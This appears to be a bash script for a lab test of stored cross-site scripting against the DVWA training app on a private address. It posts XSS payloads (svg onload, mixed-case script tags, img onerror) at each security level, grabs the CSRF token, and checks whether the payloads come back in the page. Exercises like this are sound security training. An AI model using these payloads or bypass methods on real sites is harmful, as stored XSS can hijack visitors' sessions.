CK='PHPSESSID=37451a4e56484ab7fe32cdd9b205d7ed'
BASE='http://10.31.0.87:3000'
mkdir -p evidence/xss

post_stored(){ L=$1; N=$2; M=$3
  TOK=$(curl -s -b "$CK; security=$L" "$BASE/vulnerabilities/xss_s/" | grep -oE "user_token' value='[0-9a-f]{32}" | grep -oE '[0-9a-f]{32}' | head -1)
  curl -s -b "$CK; security=$L" "$BASE/vulnerabilities/xss_s/" \
    --data-urlencode "txtName=$N" --data-urlencode "mtxMessage=$M" \
    --data-urlencode 'btnSign=Sign Guestbook' --data-urlencode "user_token=$TOK" -o /dev/null -w "post:$L %{http_code}\n"
  RES=$(curl -s -b "$CK; security=$L" "$BASE/vulnerabilities/xss_s/")
  echo "  reflected-name=$(printf '%s' "$RES" | grep -c "$N" || true)  reflected-msg($(printf '%s' "$M" | head -c 20))=$(printf '%s' "$RES" | grep -cF "$M")"
}
post_stored low 'AEGIS1' '<svg onload=alert(1)>'
post_stored medium 'AEGIS2' '<script>alert(2)</script>'
post_stored medium 'AEGIS2b' '<ScRiPt>alert(2)</ScRiPt>'
post_stored medium 'AEGIS2c' '<svg onload=alert(2)>'
post_stored high 'AEGIS3' '<svg onload=alert(3)>'
post_stored high 'AEGIS3b' '<img src=x onerror=alert(3)>'
# also try injecting in the Name field (maxlength=10 client-side only)
TOK=$(curl -s -b "$CK; security=high" "$BASE/vulnerabilities/xss_s/" | grep -oE "user_token' value='[0-9a-f]{32}" | grep -oE '[0-9a-f]{32}' | head -1)
curl -s -b "$CK; security=high" "$BASE/vulnerabilities/xss_s/" \
  --data-urlencode 'txtName=<svg onload=alert(4)>' --data-urlencode 'mtxMessage=msg' \
  --data-urlencode 'btnSign=Sign Guestbook' --data-urlencode "user_token=$TOK" -o /dev/null
curl -s -b "$CK; security=high" "$BASE/vulnerabilities/xss_s/" > evidence/xss/xss_s-high-1-response.html
grep -c '<svg onload=alert(4)>' evidence/xss/xss_s-high-1-response.html
